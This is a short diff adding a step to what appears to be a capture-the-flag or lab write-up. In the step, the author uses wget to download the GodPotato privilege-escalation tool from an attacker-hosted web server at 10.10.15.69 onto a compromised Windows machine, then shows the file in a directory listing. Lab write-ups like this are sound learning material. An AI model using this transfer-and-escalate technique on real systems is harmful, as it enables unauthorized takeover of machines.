@@ -760,3 +760,20 @@ So i can just upload GodPotato
 
 ```
 
+```python
+PS C:\users\alexander.green\Documents> wget http://10.10.15.69:4444/GodPotato-NET4.exe -o godpotato.exe
+PS C:\users\alexander.green\Documents> dir
+
+
+    Directory: C:\users\alexander.green\Documents
+
+
+Mode                 LastWriteTime         Length Name                                                                 
+----                 -------------         ------ ----                                                                 
+-a----          6/8/2026   7:01 PM          57344 godpotato.exe                                                        
+
+
+PS C:\users\alexander.green\Documents>
+```
+Ill download it from github, then transfer it my machine using a python web server
+
